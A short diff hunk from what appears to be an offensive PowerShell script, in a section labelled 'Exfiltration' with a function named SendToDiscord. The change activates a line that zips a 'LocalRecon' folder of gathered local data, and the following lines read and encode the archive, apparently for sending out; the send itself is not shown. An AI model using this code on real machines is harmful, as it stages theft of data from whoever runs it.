@@ -480,9 +480,9 @@ function pathCheck
 
 #Exfiltration
 function SendToDiscord{
-<#
-    Compress-Archive -f -Path $global:currentPath\LocalRecon\ -DestinationPath $global:currentPath\LocalRecon.zip
 
+    Compress-Archive -f -Path $global:currentPath\LocalRecon\ -DestinationPath $global:currentPath\LocalRecon.zip
+<#
     $fileBytes = [System.IO.File]::ReadAllBytes("$global:currentPath\localRecon.zip");
     $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
 
